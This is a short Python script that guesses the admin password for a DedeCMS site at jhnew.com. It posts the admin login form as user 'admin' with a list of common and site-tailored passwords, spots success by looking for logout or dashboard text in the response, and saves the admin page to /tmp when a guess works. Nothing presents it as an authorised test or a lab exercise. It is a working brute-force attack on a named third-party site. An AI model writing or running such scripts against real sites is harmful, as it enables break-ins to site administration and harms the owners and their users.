#!/usr/bin/env python3
"""jhnew DedeCMS login - proper cookie flow, no captcha"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://jhnew.com"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

PWS = ["admin", "admin123", "123456", "admin888", "dedecms", "admin@123", "12345678",
       "a123456", "admin666", "admin123456", "password", "888888", "admin000", "admin1",
       "123456789", "jhnew", "jhnew123", "shici", "gushiwen", "admin2024"]

op, cj = get_opener()
code, final, body = fetch(op, HOST + "/admin/login.php")
print("GET login: %s size=%d cookies=%d" % (code, len(body), len(cj)), flush=True)

for pw in PWS:
    data = urllib.parse.urlencode({"gotopage": "", "dopost": "login", "adminstyle": "newdedecms",
                                   "userid": "admin", "pwd": pw})
    code, final, body = fetch(op, HOST + "/admin/login.php", data=data, referer=HOST + "/admin/login.php")
    # success: redirect to index or contains menu
    ok = ("退出" in body or "logout" in body.lower() or "管理首页" in body or
          "admin_index" in body.lower() or "系统管理" in body)
    print("admin/%s: code=%s final=%s ok=%s size=%d" % (pw, code, final[:50], ok, len(body)), flush=True)
    if ok:
        print("!!! HIT admin/%s" % pw, flush=True)
        open("/tmp/jhnew_hit.html", "w").write(body)
        break
    # 405 means method issue
    if code == 405:
        print("  405 - try different post", flush=True)
        break
